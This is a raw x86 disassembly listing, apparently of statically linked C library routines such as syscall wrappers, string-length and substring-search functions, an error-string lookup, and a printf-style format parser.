cmp eax, 4
ja case.0x8049335.0
jmp dword [eax*4 + 0x8092834]
lea esi, [esi]
mov eax, dword [ecx + 8]
mov dword [esp], esi
mov dword [var_4h], eax
call dword [ecx + 4]
mov edx, dword [0x80a9054]
mov eax, dword [edx + 4]
test eax, eax
jne 0x8049320
mov eax, edx
mov edx, dword [edx]
test edx, edx
mov dword [0x80a9054], edx
je 0x804937a
mov dword [esp], eax
call fcn.08051180
invalid
mov eax, 0x14
int 0x80
ret
mov edx, ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_4h]
mov eax, 0x25
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
mov ecx, dword [arg_4h]
mov eax, ecx
and ecx, 3
je 0x8053433
cmp byte [eax], ch
je 0x80534aa
inc eax
xor ecx, 3
je 0x8053433
cmp byte [eax], ch
je 0x80534aa
add eax, 1
sub ecx, 1
je 0x8053433
cmp byte [eax], ch
je 0x80534aa
sub eax, 0xf
add eax, 0x10
mov ecx, dword [eax]
mov edx, 0xfefefeff
add edx, ecx
jae 0x8053497
xor edx, ecx
or edx, 0xfefefeff
inc edx
jne 0x8053497
mov ecx, dword [eax + 4]
mov edx, 0xfefefeff
add edx, ecx
jae 0x8053494
xor edx, ecx
or edx, 0xfefefeff
inc edx
jne 0x8053494
mov ecx, dword [eax + 8]
mov edx, 0xfefefeff
add edx, ecx
jae 0x8053491
xor edx, ecx
or edx, 0xfefefeff
inc edx
jne 0x8053491
mov ecx, dword [eax + 0xc]
mov edx, 0xfefefeff
add edx, ecx
jae 0x805348e
xor edx, ecx
or edx, 0xfefefeff
inc edx
je 0x8053430
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x80534aa
inc eax
test ch, ch
je 0x80534aa
inc eax
test ecx, 0xff0000
je 0x80534aa
inc eax
sub eax, dword [arg_4h]
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov eax, dword [arg_14h]
mov edx, dword [arg_ch]
test eax, eax
je 0x80499d7
mov eax, dword [arg_10h]
mov dword [esp], eax
call fcn.08053400
mov edx, dword [arg_8h]
cmp dword [arg_ch], edx
mov edi, eax
jbe 0x8049a3d
mov ebx, dword [arg_ch]
mov eax, dword [arg_14h]
dec ebx
mov dword [var_10h], eax
cmp ebx, dword [arg_8h]
jb 0x80499d4
mov edx, dword [arg_10h]
movzx edx, byte [edx]
mov byte [var_19h], dl
movzx eax, byte [var_19h]
cmp byte [edi + ebx - 1], al
je 0x80499e1
dec ebx
cmp ebx, dword [arg_8h]
jae 0x80499c4
mov edx, dword [arg_ch]
add esp, 0x14
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_10h]
mov ecx, 1
movzx eax, byte [edx + 1]
test al, al
je 0x8049b6b
mov edx, eax
mov eax, edi
sub eax, ecx
cmp dl, byte [eax + ebx - 1]
jne 0x8049b5e
mov eax, dword [arg_10h]
inc ecx
movzx edx, byte [ecx + eax]
test dl, dl
jne 0x80499f7
cmp ebx, dword [arg_8h]
jb 0x80499d4
mov eax, dword [arg_14h]
mov edx, dword [arg_ch]
movsx ecx, byte [eax]
sub edx, ebx
lea eax, [ecx + 1]
cmp edx, eax
je 0x8049a4b
jle 0x8049a2e
lea ebx, [ecx + ebx + 1]
mov dword [arg_ch], ebx
mov edx, dword [arg_8h]
cmp dword [arg_ch], edx
ja 0x80499ac
mov eax, dword [arg_8h]
cmp dword [arg_ch], eax
mov edx, eax
cmovae edx, dword [arg_ch]
jmp 0x80499d7
dec ebx
mov dword [var_14h], ebx
mov edx, ebx
inc dword [var_10h]
mov eax, dword [var_10h]
movzx esi, byte [eax]
mov eax, esi
test al, al
jne 0x8049a69
dec dword [var_10h]
mov eax, dword [var_10h]
movzx esi, byte [eax]
mov ebx, edx
mov edx, esi
cmp dl, 0x7f
je 0x8049b00
test dl, dl
js 0x8049b00
cmp ebx, dword [arg_8h]
mov dword [var_18h], ebx
jb 0x8049ad6
mov edx, dword [arg_10h]
movzx edx, byte [edx]
mov byte [var_19h], dl
xor ecx, ecx
cmp byte [var_19h], 0
je 0x8049af7
mov eax, dword [arg_10h]
movzx edx, byte [eax]
lea esi, [esi]
mov eax, edi
sub eax, ecx
cmp dl, byte [eax + ebx - 1]
jne 0x8049aeb
mov eax, dword [arg_10h]
inc ecx
movzx edx, byte [ecx + eax]
test dl, dl
jne 0x8049aa0
cmp ebx, dword [arg_8h]
jb 0x8049ad6
mov edx, esi
sub dword [var_18h], ebx
movsx eax, dl
cmp dword [var_18h], eax
lea edx, [ebx - 1]
je 0x8049a51
mov eax, dword [var_14h]
mov dword [arg_ch], eax
jmp 0x8049a31
mov edx, esi
sub dword [var_18h], ebx
movsx eax, dl
cmp dword [var_18h], eax
mov edx, dword [arg_ch]
jg 0x8049acb
jmp 0x80499d7
test dl, dl
je 0x8049ab6
dec ebx
cmp ebx, dword [arg_8h]
jae 0x8049a8f
jmp 0x8049ad6
mov eax, dword [arg_10h]
movzx edx, byte [eax]
jmp 0x8049aeb
nop
cmp ebx, dword [arg_8h]
jb 0x80499d4
mov eax, dword [arg_10h]
movzx eax, byte [eax]
mov byte [var_19h], al
xor ecx, ecx
cmp byte [var_19h], 0
je 0x8049b56
mov eax, dword [arg_10h]
movzx edx, byte [eax]
mov eax, edi
sub eax, ecx
cmp dl, byte [eax + ebx - 1]
jne 0x8049b47
mov eax, dword [arg_10h]
inc ecx
movzx edx, byte [ecx + eax]
test dl, dl
jne 0x8049b20
cmp ebx, dword [arg_8h]
lea edx, [ebx - 1]
jae 0x8049a51
jmp 0x80499d4
test dl, dl
je 0x8049b36
dec ebx
cmp ebx, dword [arg_8h]
jae 0x8049b12
jmp 0x80499d4
mov eax, dword [arg_10h]
movzx edx, byte [eax]
jmp 0x8049b47
test dl, dl
jne 0x80499ce
jmp 0x8049a11
mov eax, dword [arg_10h]
movzx edx, byte [eax + 1]
jmp 0x8049b5e
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov edi, dword [arg_8h]
test edi, edi
js 0x8053327
cmp edi, dword [0x80a2698]
jge 0x8053327
mov eax, dword [edi*4 + 0x80a24a0]
test eax, eax
jne 0x80533dd
mov dword [var_8h], 5
mov dword [var_4h], 0x8092dc4
mov dword [esp], str.libc
call fcn.0805f1f0
mov dword [esp], eax
mov ebx, eax
call fcn.08053400
mov dword [esp], edi
mov dword [var_8h], 0xa
mov esi, eax
mov byte [var_18h], 0
mov dword [var_ch], 0
lea eax, [var_2ch]
mov dword [var_30h], eax
lea eax, [var_18h]
mov dword [var_4h], eax
call fcn.08063c00
mov edx, dword [arg_ch]
cmp dword [arg_10h], esi
mov edi, eax
mov dword [var_4h], ebx
mov eax, dword [arg_10h]
mov dword [esp], edx
cmova eax, esi
mov dword [var_8h], eax
call fcn.08053740
cmp esi, dword [arg_10h]
mov ecx, eax
jae 0x80533c0
sub dword [var_30h], edi
mov edx, dword [arg_10h]
mov dword [var_4h], edi
mov eax, dword [var_30h]
mov dword [esp], ecx
sub edx, esi
add eax, 0x15
cmp eax, edx
cmovae eax, edx
mov dword [var_8h], eax
call fcn.08053770
mov eax, dword [arg_10h]
test eax, eax
je 0x80533d2
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov byte [edx + eax - 1], 0
mov eax, dword [arg_ch]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_8h], 5
mov dword [var_4h], eax
mov dword [esp], str.libc
call fcn.0805f1f0
jmp 0x80533d5
push ebp
mov ebp, esp
sub esp, 0xc
lea eax, [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0806b9c0
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1110
mov dword [var_1028h], 0
mov esi, dword [arg_ch]
call fcn.08048b20
mov edx, dword [arg_8h]
mov ebx, eax
mov eax, dword [eax]
mov dword [var_4h], 1
mov dword [esp], edx
mov dword [var_1048h], eax
call fcn.08076600
mov edx, 0xffffffff
dec eax
jne 0x806ba45
mov ecx, dword [arg_8h]
test byte [ecx], 8
jne 0x806ee3e
test esi, esi
je 0x806ee2e
mov edi, dword [arg_8h]
mov dword [var_4h], 1
mov dword [esp], edi
call fcn.08076600
mov edx, 0xffffffff
dec eax
jne 0x806ba45
test byte [edi], 2
je 0x806ba4f
mov ecx, dword [arg_10h]
mov edx, esi
mov eax, edi
call fcn.0806f370
mov edx, eax
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_10h]
mov dword [var_102ch], 0xffffffff
mov dword [var_1044h], 0
mov dword [esp], esi
mov dword [var_1040h], eax
call fcn.08074b00
mov ecx, dword [arg_8h]
mov dword [var_1034h], eax
mov dword [var_ff4h], eax
mov dword [var_104ch], 0
movzx edx, word [ecx]
test dx, dx
js 0x806bac8
mov eax, 0
test eax, eax
je 0x806bac8
lea eax, [var_fbch]
mov dword [var_104ch], 1
mov dword [var_8h], ecx
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
call section.
mov edi, dword [arg_8h]
movzx edx, word [edi]
test dx, dx
jns 0x806ee1e
mov edx, dword [arg_8h]
mov ebx, dword [var_1034h]
mov eax, dword [edx + 0x94]
sub ebx, esi
mov dword [esp], edx
sar ebx, 2
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
mov dword [var_1030h], 0xffffffff
cmp eax, ebx
je 0x806bb41
mov edx, dword [arg_8h]
cmp word [edx], 0
jns 0x806bb37
mov ecx, dword [var_104ch]
test ecx, ecx
jne 0x806bb1f
mov edx, dword [var_1030h]
jmp 0x806ba45
lea eax, [var_fbch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x806bb14
mov dword [esp], edx
call fcn.08074580
jmp 0x806bb0a
mov dword [var_1030h], eax
mov eax, dword [var_ff4h]
mov eax, dword [eax]
test eax, eax
je 0x806bb01
mov eax, dword [var_ff4h]
lea ecx, [var_ch]
mov dword [var_1060h], 0
mov dword [var_1064h], 0
mov dword [var_1068h], 0
mov dword [var_106ch], 0
mov dword [var_1070h], 0
mov dword [var_1074h], 0
mov dword [var_1078h], 0
lea edx, [eax + 4]
mov dword [var_107ch], 0
mov dword [var_1080h], 0
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov dword [var_1084h], 0
mov dword [var_1088h], 0xffffffff
mov dword [var_108ch], 0
mov dword [var_1090h], 0x20
mov dword [var_1038h], 0
mov dword [var_103ch], ecx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov esi, dword [var_1094h]
mov eax, dword [esi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1200]
jmp edx
mov dword [var_1064h], 1
mov eax, dword [var_ff4h]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edi, dword [var_1094h]
mov eax, dword [edi*4 + 0x80a1000]
jmp 0x806bc1a
mov eax, dword [var_ff4h]
mov dword [var_106ch], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edx, dword [var_1094h]
mov eax, dword [edx*4 + 0x80a1000]
jmp 0x806bc1a
mov dword [var_1068h], 1
mov dword [var_1090h], 0x20
mov eax, dword [var_ff4h]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov ecx, dword [var_1094h]
mov eax, dword [ecx*4 + 0x80a1000]
jmp 0x806bc1a
mov dword [var_1060h], 1
mov eax, dword [var_ff4h]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
jmp 0x806bc0d
mov eax, dword [var_1068h]
test eax, eax
mov eax, 0x30
cmovne eax, dword [var_1090h]
mov dword [var_1090h], eax
jmp 0x806bc2d
cmp dword [var_102ch], 0xffffffff
mov dword [var_1070h], 1
jne 0x806bcb6
mov ebx, 0
test ebx, ebx
je 0x806bdcb
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
test ebx, ebx
mov eax, dword [eax + 0x34]
mov dword [var_1028h], eax
je 0x806bdc4
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x2c]
mov dword [var_102ch], eax
movzx eax, byte [eax]
test al, al
je 0x806bdb5
cmp al, 0x7f
je 0x806bdb5
mov eax, dword [var_1028h]
test eax, eax
jne 0x806bcb6
mov dword [var_102ch], 0
jmp 0x806bcb6
mov eax, dword [0x80a9ab4]
jmp 0x806bd90
mov eax, dword [0x80a9ab4]
jmp 0x806bd74
mov eax, dword [var_ff4h]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov dword [var_ff0h], edx
sub eax, 0x30
cmp eax, 9
jbe 0x806edf4
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
mov dword [var_1084h], eax
js 0x806edd3
mov eax, dword [var_1084h]
add eax, 0x20
cmp eax, 0x3e7
jle 0x806be54
mov ebx, dword [var_1084h]
shl ebx, 2
lea esi, [ebx + 0x80]
cmp esi, 0x1000
ja 0x806ed9b
lea eax, [ebx + 0x90]
sub esp, eax
lea eax, [var_10f9h]
and eax, 0xfffffff0
lea eax, [ebx + eax + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_ff4h]
mov edx, case.0x806bc21.32
mov eax, dword [eax]
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edi, dword [var_1094h]
mov eax, dword [edi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1280]
jmp edx
mov edx, dword [0x80aad28]
xor edi, edi
test edx, edx
je 0x806beae
mov ecx, dword [var_1044h]
mov esi, dword [var_10a0h]
lea eax, [ecx + ecx*2]
shl eax, 4
mov eax, dword [esi + eax + 8]
mov edi, dword [edx + eax*4]
test edi, edi
mov eax, fcn.0806ee50
mov edx, dword [var_10a0h]
cmove edi, eax
mov eax, dword [var_1044h]
lea esi, [eax + eax*2]
shl esi, 4
mov ebx, dword [edx + esi + 0x2c]
xor edx, edx
lea eax, [ebx*4 + 0x10]
sub esp, eax
lea ecx, [var_23h]
and ecx, 0xfffffff0
cmp edx, ebx
jae 0x806bf0b
mov eax, dword [var_10a0h]
mov esi, dword [eax + esi + 0x24]
lea eax, [esi + esi*2]
mov esi, dword [var_10a8h]
lea eax, [esi + eax*4]
lea esi, [esi]
mov dword [ecx + edx*4], eax
add eax, 0xc
inc edx
cmp edx, ebx
jb 0x806bf00
mov edx, dword [var_1044h]
mov dword [var_8h_2], ecx
mov ecx, dword [arg_8h]
lea eax, [edx + edx*2]
mov dword [esp], ecx
shl eax, 4
add eax, dword [var_10a0h]
mov dword [var_4h_2], eax
call edi
test eax, eax
js 0x806c5e3
add dword [var_1030h], eax
mov esi, dword [var_1104h]
test esi, esi
jne 0x806ed88
mov eax, dword [var_1044h]
mov ecx, dword [var_10a0h]
mov edi, dword [arg_8h]
lea ebx, [eax + eax*2]
shl ebx, 4
mov edx, dword [edi + 0x94]
mov eax, dword [ecx + ebx + 0x18]
sub eax, dword [ecx + ebx + 0x14]
sar eax, 2
mov dword [var_8h_2], eax
mov eax, dword [ecx + ebx + 0x14]
mov dword [esp], edi
mov dword [var_4h_2], eax
call dword [edx + 0x1c]
mov esi, dword [var_10a0h]
mov edx, eax
mov eax, dword [esi + ebx + 0x18]
sub eax, dword [esi + ebx + 0x14]
sar eax, 2
cmp edx, eax
jne 0x806c5e3
inc dword [var_1044h]
add dword [var_1030h], edx
mov edi, dword [var_1098h]
cmp dword [var_1044h], edi
jae 0x806c5ed
mov edx, dword [var_1044h]
mov esi, dword [var_10a0h]
mov dword [var_1104h], 0
lea ecx, [edx + edx*2]
shl ecx, 4
movzx ebx, byte [esi + ecx + 0xc]
mov eax, ebx
shr al, 3
mov edi, eax
mov eax, ebx
shr al, 4
and edi, 1
mov edx, eax
mov dword [var_10cch], edi
mov eax, ebx
shr al, 5
and edx, 1
mov esi, eax
mov dword [var_10d0h], edx
mov eax, ebx
shr al, 6
and esi, 1
mov edi, eax
mov dword [var_10d4h], esi
mov eax, ebx
shr al, 7
mov esi, dword [var_10a0h]
and edi, 1
movzx eax, al
mov dword [var_10d8h], edi
mov dword [var_10dch], eax
mov eax, ebx
and eax, 1
mov dword [var_10e0h], eax
mov eax, ebx
shr al, 1
mov edx, eax
mov eax, ebx
and edx, 1
shr al, 2
mov dword [var_10e4h], edx
movzx edx, byte [esi + ecx + 0xd]
mov esi, eax
mov eax, dword [var_10a0h]
and esi, 1
mov dword [var_10ech], esi
mov eax, dword [eax + ecx]
shr dl, 1
mov edi, edx
shr dl, 2
mov esi, edx
and edi, 1
mov edx, dword [var_10a0h]
mov dword [var_10f4h], eax
and esi, 1
mov dword [var_10e8h], edi
mov eax, dword [var_10a0h]
mov dword [var_10f8h], esi
mov edi, dword [var_10a0h]
mov esi, dword [var_10a0h]
mov edx, dword [edx + ecx + 8]
movzx eax, byte [eax + ecx + 0x10]
mov edi, dword [edi + ecx + 4]
mov dword [var_1100h], edx
mov dword [var_10f0h], edi
mov byte [var_10f9h], al
mov eax, dword [esi + ecx + 0x20]
cmp eax, 0xffffffff
je 0x806c0f0
mov edi, dword [var_10a8h]
lea eax, [eax + eax*2]
mov eax, dword [edi + eax*4]
test eax, eax
mov dword [esi + ecx + 4], eax
js 0x806ed6c
mov eax, dword [var_10a0h]
mov ecx, dword [eax + ecx + 4]
mov dword [var_10f0h], ecx
mov ecx, dword [var_1044h]
mov esi, dword [var_10a0h]
lea edx, [ecx + ecx*2]
shl edx, 4
mov eax, dword [esi + edx + 0x1c]
cmp eax, 0xffffffff
je 0x806c131
mov edi, dword [var_10a8h]
lea eax, [eax + eax*2]
mov eax, dword [edi + eax*4]
test eax, eax
mov dword [esi + edx], eax
js 0x806ed60
mov eax, dword [var_10a0h]
mov edx, dword [eax + edx]
mov dword [var_10f4h], edx
mov edx, dword [var_10f4h]
cmp dword [var_10f0h], edx
mov eax, edx
cmovge eax, dword [var_10f0h]
add eax, 0x20
cmp eax, 0x3e8
jle 0x806c1b2
cmp dword [var_10f0h], edx
mov eax, edx
cmovge eax, dword [var_10f0h]
lea eax, [eax*4 + 0x80]
cmp eax, 0x1000
ja 0x806ed01
mov ecx, dword [var_10f4h]
cmp dword [var_10f0h], ecx
mov eax, ecx
cmovge eax, dword [var_10f0h]
lea eax, [eax*4 + 0x90]
sub esp, eax
mov eax, ecx
lea edx, [var_23h]
and edx, 0xfffffff0
cmp dword [var_10f0h], ecx
cmovge eax, dword [var_10f0h]
lea eax, [edx + eax*4 + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_1100h]
mov edx, case.0x806c1dd.32
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov esi, dword [var_1100h]
mov eax, dword [esi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1500]
jmp edx
mov eax, dword [var_1094h]
test eax, eax
je 0x806c5e3
sub esp, 0x610
mov dword [var_1098h], 0
mov dword [var_109ch], 0x20
lea edi, [var_23h]
mov dword [var_10a4h], 0
mov dword [var_1010h], 0
and edi, 0xfffffff0
cmp dword [var_102ch], 0xffffffff
mov dword [var_10a0h], edi
je 0x806c57a
mov edx, dword [var_1034h]
mov eax, dword [edx]
mov dword [var_ff4h], edx
test eax, eax
je 0x806c36c
mov ecx, dword [var_1098h]
lea ecx, [ecx + ecx*2]
shl ecx, 4
mov dword [var_1108h], ecx
lea esi, [esi]
mov esi, dword [var_109ch]
cmp dword [var_1098h], esi
jb 0x806c30f
mov ebx, esi
mov edi, dword [var_10a0h]
add ebx, ebx
lea eax, [ebx + ebx*2]
mov dword [var_109ch], ebx
shl eax, 4
mov dword [var_10ach], edi
add eax, 0x10
sub esp, eax
lea eax, [var_23h]
and eax, 0xfffffff0
mov dword [var_10a0h], eax
mov eax, edi
add eax, dword [var_1108h]
cmp dword [var_10a0h], eax
je 0x806c569
mov ecx, dword [var_1108h]
mov edi, dword [var_10a0h]
cld
mov esi, dword [var_10ach]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
test byte [var_1108h], 2
mov edx, edi
je 0x806c2e3
movzx eax, word [esi]
add edx, 2
add esi, 2
mov word [edi], ax
test byte [var_1108h], 1
je 0x806c2f1
movzx eax, byte [esi]
mov byte [edx], al
mov eax, dword [var_10a0h]
add eax, dword [var_1108h]
cmp dword [var_10ach], eax
je 0x806c558
mov edx, dword [var_ff4h]
lea eax, [var_1010h]
mov ebx, dword [var_1108h]
mov ecx, dword [var_10a4h]
mov dword [var_sp_ch], eax
mov dword [esp], edx
mov eax, dword [var_10a0h]
mov dword [var_4h_2], ecx
add eax, ebx
mov dword [var_8h_2], eax
call fcn.08074b20
mov esi, dword [var_10a0h]
add dword [var_10a4h], eax
inc dword [var_1098h]
add dword [var_1108h], 0x30
mov eax, dword [esi + ebx + 0x18]
mov dword [var_ff4h], eax
mov edx, eax
mov eax, dword [eax]
test eax, eax
jne 0x806c260
mov edi, dword [var_1010h]
mov eax, dword [var_10a4h]
cld
cmp edi, eax
cmovae eax, edi
mov ecx, eax
mov dword [var_10b0h], eax
shl ecx, 2
lea eax, [ecx + 0x10]
shr ecx, 2
sub esp, eax
xor eax, eax
lea edx, [var_23h]
and edx, 0xfffffff0
mov edi, edx
mov dword [var_10b4h], edx
rep stosd dword es:[edi], eax
mov ecx, dword [var_10b0h]
lea eax, [ecx + ecx*2]
lea eax, [eax*4 + 0x10]
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov dword [var_10b8h], esi
mov dword [var_10a8h], esi
xor esi, esi
cmp esi, dword [var_1098h]
jae 0x806c452
mov ebx, dword [var_10a0h]
xor edi, edi
add ebx, 0x2c
mov esi, esi
mov eax, dword [ebx - 0xc]
cmp eax, 0xffffffff
je 0x806c3f5
mov edx, dword [var_10b4h]
mov dword [edx + eax*4], 0
mov eax, dword [ebx - 0x10]
cmp eax, 0xffffffff
je 0x806c40a
mov ecx, dword [var_10b4h]
mov dword [ecx + eax*4], 0
mov eax, dword [ebx]
test eax, eax
je 0x806c443
dec eax
je 0x806c544
mov eax, dword [ebx - 8]
mov ecx, dword [var_10b4h]
mov edx, dword [ebx - 0x24]
lea eax, [ecx + eax*4]
mov dword [var_8h_2], eax
mov eax, dword [ebx]
mov dword [var_4h_2], eax
mov eax, dword [var_10a0h]
add eax, edi
mov dword [esp], eax
mov eax, dword [0x80aad94]
call dword [eax + edx*4]
inc esi
add edi, 0x30
add ebx, 0x30
cmp esi, dword [var_1098h]
jb 0x806c3e0
xor esi, esi
cmp esi, dword [var_10b0h]
jae 0x806c4a4
mov ebx, dword [var_10b8h]
mov edi, dword [var_10b4h]
mov eax, dword [edi + esi*4]
cmp eax, 5
je 0x806c487
jg 0x806c4cf
cmp eax, 2
je 0x806c487
jg 0x806c4c5
test eax, eax
je 0x806c487
cmp eax, 1
je 0x806c487
test ah, 8
je 0x806c4b5
mov eax, dword [var_1040h]
add dword [var_1040h], 4
mov eax, dword [eax]
mov dword [ebx], eax
inc esi
add ebx, 0xc
cmp esi, dword [var_10b0h]
jb 0x806c462
mov eax, dword [var_1098h]
cmp dword [var_1044h], eax
jmp 0x806bfb4
xor eax, eax
xor edx, edx
xor ecx, ecx
mov dword [ebx], eax
mov dword [ebx + 4], edx
mov dword [ebx + 8], ecx
jmp 0x806c498
cmp eax, 3
je 0x806c487
cmp eax, 4
jmp 0x806c480
cmp eax, 0x100
je 0x806c52a
jg 0x806c4f5
cmp eax, 6
je 0x806c4e2
cmp eax, 7
jne 0x806c482
mov eax, dword [var_1040h]
add dword [var_1040h], 8
fld qword [eax]
fstp qword [ebx]
jmp 0x806c498
cmp eax, 0x200
je 0x806c487
jg 0x806c520
cmp eax, 0x107
jne 0x806c482
mov eax, dword [var_1040h]
add dword [var_1040h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
jmp 0x806c4bb
cmp eax, 0x400
jmp 0x806c480
mov eax, dword [var_1040h]
add dword [var_1040h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [ebx + 4], edx
jmp 0x806c496
mov edx, dword [ebx - 8]
mov eax, dword [ebx - 4]
mov ecx, dword [var_10b4h]
mov dword [ecx + edx*4], eax
jmp 0x806c443
mov eax, ebx
shr eax, 1
add ebx, eax
mov dword [var_109ch], ebx
jmp 0x806c309
mov eax, ebx
shr eax, 1
add ebx, eax
mov dword [var_109ch], ebx
jmp 0x806c30f
mov ebx, 0
test ebx, ebx
je 0x806c5dc
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
test ebx, ebx
mov eax, dword [eax + 0x34]
mov dword [var_1028h], eax
je 0x806c5d5
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x2c]
mov dword [var_102ch], eax
movzx eax, byte [eax]
test al, al
je 0x806c5c6
cmp al, 0x7f
jne 0x806c235
mov dword [var_102ch], 0
jmp 0x806c235
mov eax, dword [0x80a9ab4]
jmp 0x806c5ab
mov eax, dword [0x80a9ab4]
jmp 0x806c58f
mov dword [var_1030h], 0xffffffff
mov ebx, dword [var_1038h]
test ebx, ebx
je 0x806bb01
mov eax, dword [var_1038h]
mov dword [esp], eax
call fcn.08051180
jmp 0x806bb01
mov edx, dword [var_1044h]
lea eax, [edx + edx*2]
mov edx, dword [var_10a0h]
shl eax, 4
add edx, eax
jne 0x806c762
lea ebx, [var_fech]
mov eax, edx
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_10f4h]
mov esi, dword [var_1100h]
rep stosd dword es:[edi], eax
mov ecx, dword [var_10f0h]
movzx eax, byte [var_10e4h]
mov dword [var_fech], edx
mov dword [var_fe4h], esi
mov dword [var_fe8h], ecx
movzx ecx, byte [var_10e0h]
and eax, 1
add eax, eax
and ecx, 1
movzx edx, byte [var_fe0h]
or byte [var_fdfh], 4
and edx, 0xfffffffc
or edx, ecx
movzx ecx, byte [var_10ech]
or edx, eax
movzx eax, byte [var_10cch]
and edx, 0xfffffff3
and ecx, 1
shl ecx, 2
and eax, 1
shl eax, 3
or edx, ecx
movzx ecx, byte [var_10d0h]
or edx, eax
movzx eax, byte [var_10d4h]
and edx, 0xffffffcf
and ecx, 1
shl ecx, 4
and eax, 1
shl eax, 5
or edx, ecx
movzx ecx, byte [var_10dch]
or edx, eax
movzx eax, byte [var_10d8h]
and edx, 0x3f
shl ecx, 7
and eax, 1
shl eax, 6
or edx, eax
movsx eax, byte [var_10f9h]
or edx, ecx
mov ecx, dword [var_10e0h]
mov byte [var_fe0h], dl
test ecx, ecx
mov dword [var_fdch], eax
je 0x806c751
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_fc8h], edx
mov dword [var_fc4h], ecx
mov dword [var_fcch], eax
lea eax, [var_fcch]
mov dword [var_4h_2], ebx
mov dword [var_1018h], eax
lea eax, [var_1018h]
mov dword [var_8h_2], eax
mov edi, dword [arg_8h]
mov dword [esp], edi
call fcn.0806a140
jmp 0x806bf2d
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0xfcc]
jmp 0x806c727
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + eax + 0x24]
mov dword [var_4h_2], edx
lea eax, [eax + eax*2]
lea eax, [esi + eax*4]
jmp 0x806c731
mov edx, dword [var_10d4h]
dec dword [var_10f0h]
test edx, edx
jne 0x806c7bb
mov eax, dword [var_10f0h]
test eax, eax
jle 0x806c7bb
mov ecx, dword [var_10f0h]
mov esi, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov dword [esp], esi
call fcn.08075900
add dword [var_1030h], eax
mov edi, dword [var_1044h]
mov eax, dword [var_10a0h]
lea edx, [edi + edi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806c84f
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806c83d
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806c5e3
mov ebx, dword [var_10d4h]
inc dword [var_1030h]
test ebx, ebx
je 0x806bf3b
mov ecx, dword [var_10f0h]
test ecx, ecx
jle 0x806bf3b
mov eax, dword [var_10f0h]
mov edx, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], eax
mov dword [esp], edx
call fcn.08075900
jmp 0x806bf35
mov edx, dword [arg_8h]
mov dword [var_4h_2], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806c7f3
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov ecx, dword [esi + eax*4]
mov edi, dword [arg_8h]
